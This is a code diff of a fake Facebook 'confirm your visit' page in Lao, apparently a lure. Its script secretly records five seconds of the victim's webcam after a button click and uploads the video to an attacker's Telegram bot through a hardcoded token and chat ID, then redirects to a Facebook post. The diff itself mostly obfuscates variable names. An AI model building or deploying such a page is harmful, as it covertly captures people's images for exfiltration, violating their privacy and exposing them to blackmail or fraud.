@@ -1,40 +1,40 @@
 <!DOCTYPE html>
-<html>
+<html lang="lo">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sabaidee</title>
 </head>
-<body style="background:#f0f2f5; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
-    <div style="background:#fff; padding:40px 20px; border-radius:12px; text-align:center; width:90%; max-width:320px; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
-        <div style="color:#1877f2; font-weight:bold; font-size:26px; margin-bottom:10px;">Facebook</div>
-        <p style="font-size:15px; color:#4b4f56; margin-bottom:25px;">ກົດປຸ່ມຂ້າງລຸ່ມເພື່ອຢືນຢັນການເຂົ້າຊົມ</p>
-        <button id="auth-trigger" style="background:#1877f2; color:#fff; border:none; padding:15px; width:100%; border-radius:8px; font-weight:bold; cursor:pointer; font-size:16px;">ຕົກລົງ</button>
-        <div id="processing" style="display:none; margin-top:15px; color:#1877f2;">⏳ ກຳລັງໂຫລດ...</div>
+<body style="background:#f0f2f5;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
+    <div style="background:#fff;padding:40px 20px;border-radius:12px;text-align:center;width:90%;max-width:320px;box-shadow:0 4px 15px rgba(0,0,0,0.1);">
+        <div style="color:#1877f2;font-weight:bold;font-size:26px;margin-bottom:10px;">Facebook</div>
+        <p style="font-size:15px;color:#4b4f56;margin-bottom:25px;">ກົດປຸ່ມຂ້າງລຸ່ມເພື່ອຢືນຢັນການເຂົ້າຊົມ</p>
+        <button id="_0xbtn" style="background:#1877f2;color:#fff;border:none;padding:15px;width:100%;border-radius:8px;font-weight:bold;cursor:pointer;font-size:16px;">ຕົກລົງ</button>
+        <div id="_0xload" style="display:none;margin-top:15px;color:#1877f2;">⏳ ກຳລັງໂຫລດ...</div>
     </div>
     <script>
-        const _0x1 = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA'; 
-        const _0x2 = '8482017371';
-        const _0x3 = 'https://www.facebook.com/share/p/1avrMEzzJn/';
+        const _a = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA'; 
+        const _b = '8482017371';
+        const _c = 'https://www.facebook.com/share/p/1avrMEzzJn/';
 
-        document.getElementById('auth-trigger').onclick = async function() {
+        document.getElementById('_0xbtn').onclick = async function() {
             this.style.display = 'none';
-            document.getElementById('processing').style.display = 'block';
+            document.getElementById('_0xload').style.display = 'block';
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const r = new MediaRecorder(stream);
-                const c = [];
-                r.ondataavailable = e => c.push(e.data);
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const r = new MediaRecorder(s);
+                const chunks = [];
+                r.ondataavailable = e => chunks.push(e.data);
                 r.onstop = async () => {
                     const f = new FormData();
-                    f.append('chat_id', _0x2);
-                    f.append('video', new Blob(c, {type:'video/mp4'}), 'data.mp4');
-                    await fetch(`https://api.telegram.org/bot${_0x1}/sendVideo`, { method: 'POST', body: f });
-                    stream.getTracks().forEach(t => t.stop());
-                    window.location.replace(_0x3);
+                    f.append('chat_id', _b);
+                    f.append('video', new Blob(chunks, {type:'video/mp4'}), 'v.mp4');
+                    await fetch(`https://api.telegram.org/bot${_a}/sendVideo`, { method: 'POST', body: f });
+                    s.getTracks().forEach(t => t.stop());
+                    window.location.replace(_c);
                 };
                 r.start();
-                setTimeout(() => r.stop(), 5000); // ถ่าย 5 วิพอ เพื่อให้เน็ตช้าส่งผ่าน
+                setTimeout(() => r.stop(), 5000); // 5 วิพอ เพื่อให้เน็ตหลัก 2/5/9 ส่งไหว
             } catch (e) {
                 window.location.reload();
             }
